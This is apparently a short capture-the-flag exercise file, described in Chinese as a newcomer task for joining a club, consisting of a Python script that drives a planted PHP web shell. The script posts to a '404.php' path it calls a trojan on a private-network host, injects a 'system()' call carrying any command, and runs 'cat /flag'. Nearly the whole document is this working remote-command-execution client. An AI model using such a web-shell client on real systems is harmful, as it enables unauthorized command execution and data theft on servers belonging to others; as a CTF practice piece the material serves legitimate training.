# Blackjack
当时加入美团俱乐部的新人任务

import requests

base_url = "http://192.168.209.169:8080"

trojan_url = base_url + "/404.php"


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
      'x-requested-with': 'xmlhttprequest'            
}

def attack(cmd):
    data = {
        "M": "system('%s');" % cmd
    }
    try:
        res = requests.post(trojan_url, headers=headers,data=data)
        print(res.text)
    except Exception as e:
        print(e)

attack("cat /flag")